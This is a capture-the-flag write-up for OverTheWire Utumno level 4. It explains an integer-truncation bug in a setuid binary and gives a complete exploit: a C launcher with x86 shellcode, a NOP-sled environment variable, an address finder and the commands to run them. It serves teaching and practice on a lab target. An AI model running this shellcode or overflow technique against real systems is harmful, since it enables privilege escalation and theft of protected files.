# OverTheWire — Utumno Level 4 Solution (utumno4 → utumno5)

> Goal: Get utumno5 user's password from `utumno4`.
> Technique: **Integer truncation** (16-bit check vs 32-bit `memcpy`) → massive stack overflow;
> env-var shellcode on executable stack + embedded `cat` command.

---

## 1. Connection

```bash
ssh utumno4@utumno.labs.overthewire.org -p 2227
# password: **********   (from the previous level)
```

---

## 2. Recon

```bash
ls -la /utumno/utumno4
# -r-sr-x--- 1 utumno5 utumno4 12784 utumno4   <-- SUID utumno5, group utumno4 = READABLE
strings /utumno/utumno4 | grep -E 'atoi|memcpy|protector'
#   atoi, memcpy
#   ... -fno-stack-protector ...               <-- NO canary
readelf -l /utumno/utumno4 | grep GNU_STACK
#   GNU_STACK ... RWE                           <-- stack EXECUTABLE
```
Key functions: **`atoi`** (number from argv) + **`memcpy`** (copy from argv). Classic
"user supplies the size" scenario.

---

## 3. Static Analysis — `main` (integer truncation)

```bash
objdump -d -M intel /utumno/utumno4 | sed -n '/<main>:/,/^$/p'
```

Pseudocode:
```c
int main(int argc, char **argv) {
    char buf[0xff02];                 // ebp-0xff02 (stack-clash probing large frame)
    int  n = atoi(argv[1]);           // [ebp-0x4]  = full 32-bit
    short s = (short)n;               // [ebp-0x6]  = low 16 bits
    if ((unsigned short)s > 0x3f)     // CHECK looks only at low 16 bits
        exit(1);
    memcpy(buf, argv[2], n);          // but memcpy uses full 32-bit n  <<< BUG
    return 0;
}
```

**Vulnerability (type mismatch / truncation):**
- Bounds check uses **low 16 bits** of `(short)n` (`<= 0x3f`).
- `memcpy` length uses **full 32-bit `n`**.
- `n = 0x10000 (65536)` → low 16 bits = `0x0000` ≤ `0x3f` ⇒ **check passes**, but
  `memcpy` copies **65536 bytes** → massive buffer overflow.

**Offset:** `dest = ebp - 0xff02`, return address at `ebp+4`. Distance = `0xff02 + 4 = 0xff06` (65286).
`n = 0x10000` → 65536 bytes copied, easily overwrites return address at `0xff06`.

---

## 4. Strategy

Since `atoi`/`memcpy` are fed from argv, use a **launcher** that calls the target via `execve`:
- `argv = {"/utumno/utumno4", "65536", BIGARG, NULL}`
  - `BIGARG` = `0xff06` bytes padding + **4 bytes return address** + padding (total `0x10000`).
- Put shellcode with a large **NOP sled** in `EGG` env variable (stack RWE, ASLR off).
- Return address points to the EGG sled's midpoint → shellcode → `cat /etc/utumno_pass/utumno5`.

### Key observation — env address is unaffected by argv size
In the Linux stack layout, **env strings are at the very top**, with argv strings **below** them.
So even a huge 65536-byte `argv[2]` does **not** shift the `EGG` env address downward →
`environ[0]` is independent of argv size, stays fixed. (The printer-found address is directly valid.)

### Embedding the command in shellcode
Same as utumno3: no stdin, command is embedded. Null-free shellcode runs
`/bin/sh -c "cat /etc/utumno_pass/utumno5"` on the stack (only difference from utumno4:
the command string's last dword is `"mno5"` → byte `0x34`→`0x35`).

---

## 5. Final Exploit

### `ex4.c` — launcher
```c
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
unsigned char sc[]={ /* null-free: setreuid; execve /bin/sh -c "cat .../utumno5" */
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,
 0x68,0x6d,0x6e,0x6f,0x35, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
#define BIGLEN 0x10000
#define RETOFF 0xff06
static char eggenv[4+SLED+256];
static char bigarg[BIGLEN+1];
static char *envp[2];
int main(int argc,char**argv){
 memcpy(eggenv,"EGG=",4); memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc); eggenv[4+SLED+sizeof sc]=0;
 envp[0]=eggenv; envp[1]=0;
 unsigned int ret=0x41414141;
 if(argc>=3 && !strcmp(argv[1],"run")) ret=strtoul(argv[2],0,16);
 memset(bigarg,'A',BIGLEN); *(unsigned int*)(bigarg+RETOFF)=ret; bigarg[BIGLEN]=0;
 char *av_run[]={"/utumno/utumno4","65536",bigarg,0};
 char *av_find[]={"/tmp/p2A7xK9mLq","65536",bigarg,0};
 if(argc>=2 && !strcmp(argv[1],"find")) execve("/tmp/p2A7xK9mLq",av_find,envp);
 else execve("/utumno/utumno4",av_run,envp);
 perror("execve"); return 1;
}
```

### `pr.c` (env address finder)
```c
#include <stdio.h>
extern char **environ;
int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
```

### Execution
```bash
gcc -m32 -o ex4 ex4.c
gcc -m32 -o /tmp/p2A7xK9mLq pr.c

ENV0=$(./ex4 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")   # sled midpoint
./ex4 run "$RET"           # n=65536 -> memcpy overflow -> ret -> sled -> cat
```

Output:
```
ENV0=fffef51f RET=ffff6a53
**********
```

---

## 6. Verification

```bash
ssh utumno5@utumno.labs.overthewire.org -p 2227
# password: **********
```
```
uid=16005(utumno5) gid=16005(utumno5) groups=16005(utumno5)
$ cat /etc/utumno_pass/utumno5
**********
```
✅ Success.

---

## Summary / Lessons Learned

| Topic | Note |
|-------|------|
| **Integer truncation** | Check is `(short)n` (16-bit), usage is `memcpy(...,n)` (32-bit) → mismatch |
| **Bypass value** | `n = 0x10000` → low 16 bits = 0 ≤ 0x3f passes, but 65536 bytes are copied |
| **Offset 0xff06** | `dest = ebp-0xff02`, ret at `ebp+4` → distance `0xff06` |
| **env at top of stack** | No matter how large argv is, env address (EGG) stays fixed |
| **Self-contained shellcode** | Same approach as utumno3; change `utumno4`→`utumno5` in command string |
